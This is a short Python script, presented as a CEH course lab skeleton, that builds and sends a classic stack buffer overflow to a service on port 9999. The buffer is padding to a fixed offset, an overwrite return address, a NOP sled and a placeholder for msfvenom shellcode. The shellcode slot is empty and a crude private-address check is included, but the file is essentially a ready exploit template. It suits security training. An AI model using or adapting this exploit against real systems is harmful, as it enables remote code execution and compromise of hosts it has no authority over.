#!/usr/bin/env python3
# LAB-ONLY: Buffer Overflow Helper Skeleton
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Skeleton script for sending buffer overflow patterns (for lab use only!)
import sys
import socket

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_IP = "192.168.100.10"
LAB_TARGET_PORT = 9999
LAB_OFFSET = 2003
LAB_EIP = b"\xaf\x11\x50\x62"  # Replace with your lab target address
LAB_NOP_SLED = b"\x90" * 32
LAB_SHELLCODE = b""  # Replace with msfvenom payload (LAB ONLY!)
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Buffer Overflow Helper")
    print("="*80)
    buffer = b"A" * LAB_OFFSET
    buffer += LAB_EIP
    buffer += LAB_NOP_SLED
    buffer += LAB_SHELLCODE
    print(f"Sending buffer (length: {len(buffer)} bytes) to {LAB_TARGET_IP}:{LAB_TARGET_PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LAB_TARGET_IP, LAB_TARGET_PORT))
    s.send(buffer + b"\r\n")
    s.close()

if __name__ == "__main__":
    if not any(p in LAB_TARGET_IP for p in ["10.", "172.16.", "192.168.", "localhost"]):
        sys.exit("ERROR: LAB-ONLY!")
    main()
